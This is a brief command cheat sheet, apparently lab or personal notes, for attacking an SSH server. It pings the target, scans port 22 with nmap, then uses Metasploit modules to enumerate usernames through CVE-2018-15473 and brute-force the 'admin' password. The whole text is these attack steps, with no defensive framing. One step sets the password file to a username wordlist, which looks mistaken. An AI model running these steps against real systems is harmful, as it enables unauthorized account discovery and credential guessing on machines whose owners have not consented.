To find iP adress : ping www.target.com

Scan using nmap :  nmap -sV -p22 www.target.com

USE MSFCONSOLE:

To find username 

1. search CVE-2018-15473
2. use auxiliary/scanner/ssh/ssh_enumusers
3. set RHOSTS targetip
4. set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt 
5. run

To find password

1. use auxiliary/scanner/ssh/ssh_login
2. set RHOSTS targetip
3. set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
4. set USERNAME admin
5. run
